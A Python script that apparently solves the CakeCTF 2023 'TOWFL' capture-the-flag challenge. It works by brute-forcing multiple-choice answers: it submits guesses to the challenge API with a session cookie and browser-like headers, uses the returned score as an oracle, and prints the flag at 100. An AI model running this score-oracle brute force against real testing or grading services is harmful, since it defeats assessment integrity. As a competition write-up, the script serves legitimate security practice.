import requests
import json

cookies = {
    "session": "<session-cookie>",
}

mcq_solutions_correct = []

previous_score = -1
set_no = -1
q_no = 0

mcq_solutions = [
    [
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
    ],
    [
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
    ],
    [
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
    ],
    [
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
    ],
    [
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
    ],
    [
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
    ],
    [
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
    ],
    [
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
    ],
    [
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
    ],
    [
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
    ],
]

while True:
    try:
        mcq_solutions[set_no][q_no] += 1
    except TypeError:
        mcq_solutions[set_no][q_no] = 0

    requests.post(
        "http://towfl.2023.cakectf.com:8888/api/submit",
        cookies=cookies,
        json=mcq_solutions,
        headers={
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Referer": "http://towfl.2023.cakectf.com:8888/",
            "Content-Type": "application/json",
            "Origin": "http://towfl.2023.cakectf.com:8888",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache",
        },
    )

    response = requests.get(
        "http://towfl.2023.cakectf.com:8888/api/score",
        cookies=cookies,
        headers={
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Referer": "http://towfl.2023.cakectf.com:8888/",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache",
        },
    )

    response = json.loads(response.content.decode())["data"]
    print(response["score"])
    if response["score"] != previous_score:
        mcq_solutions_correct = mcq_solutions
        previous_score = response["score"]
        q_no += 1
        if q_no == 10:
            q_no = 0
            set_no += 1

    if previous_score == 100:
        print(response["flag"])
        break
